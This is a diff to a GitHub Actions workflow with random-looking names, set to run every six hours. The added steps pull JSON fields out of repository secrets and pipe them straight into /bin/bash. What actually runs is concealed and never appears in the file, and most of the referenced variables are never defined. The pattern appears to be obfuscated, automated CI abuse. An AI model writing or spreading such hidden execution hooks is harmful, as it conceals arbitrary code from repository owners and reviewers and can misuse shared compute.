@@ -1,29 +1,32 @@
 name: humoxi8192
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 0/6 * * *'
-
-jobs:  # 3304
+    - cron: '42 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: humoxi8192
         env:
-          kqxx4006: ${{ secrets.kqxx4006 }}
+          oag8541: ${{ secrets.oag8541 }}
         run: |
-          echo $kqxx4006 | jq -r .mhkxv9228 | /bin/bash
-          echo $zsc049 | jq -r .jvyx51 | /bin/bash
-          echo $ajr5761 | jq -r .nob02 | /bin/bash
-          echo $vsq4 | jq -r .yuge64401 | /bin/bash
-          echo $k42550 | jq -r .pi29189 | /bin/bash
-          echo $nt73 | jq -r .dtx9 | /bin/bash
-          echo $utx412 | jq -r .arj34875 | /bin/bash
-          echo $q32 | jq -r .ascas305 | /bin/bash
-          echo $zsni7 | jq -r .f5 | /bin/bash
-          echo $zbjjr1 | jq -r .nho5 | /bin/bash
-          echo $eq3 | jq -r .cbdue1 | /bin/bash
-          echo $x6 | jq -r .v572 | /bin/bash
-          echo $jefi11975 | jq -r .yf661 | /bin/bash
+          echo $oag8541 | jq -r .jzho43250 | /bin/bash
+          echo $fuakn07521 | jq -r .rdqz0 | /bin/bash
+          echo $sfa3208 | jq -r .yij9232 | /bin/bash
+          echo $veotd22464 | jq -r .c05985 | /bin/bash
+          echo $m7 | jq -r .vsbd0 | /bin/bash
+          echo $nq38 | jq -r .upclp62 | /bin/bash
+          echo $mvder331 | jq -r .wkrws8145 | /bin/bash
+          echo $vrx3199 | jq -r .tdfyx22768 | /bin/bash
+          echo $btgp2445 | jq -r .lkdew1366 | /bin/bash
+          echo $dr87 | jq -r .xmh7 | /bin/bash
+          echo $xzti549 | jq -r .e082 | /bin/bash
+          echo $eiajp1515 | jq -r .hhff67595 | /bin/bash
+          echo $yim0 | jq -r .wrnvu82 | /bin/bash
+          echo $teq5088 | jq -r .z0924 | /bin/bash
+          echo $ew3 | jq -r .hq121 | /bin/bash
 
